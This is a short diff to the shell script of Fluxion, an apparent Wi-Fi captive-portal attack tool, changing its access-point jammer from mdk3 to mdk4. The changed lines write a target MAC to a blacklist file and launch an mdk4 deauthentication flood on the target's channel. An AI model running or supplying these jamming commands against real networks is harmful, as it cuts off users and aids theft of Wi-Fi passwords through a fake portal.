@@ -1345,7 +1345,7 @@ stop_attack() {
       2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
     CaptivePortalJammerServiceXtermPID="" # Clear parent PID
   fi
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
   # Kill captive portal web server log viewer.
   if [ "$CaptivePortalWebServiceXtermPID" ]; then
@@ -1441,7 +1441,7 @@ start_attack() {
   CaptivePortalWebServiceXtermPID=$!
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
-  echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
+  echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
@@ -1453,7 +1453,7 @@ start_attack() {
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   elif [[ $option_deauth -eq 2 ]]; then
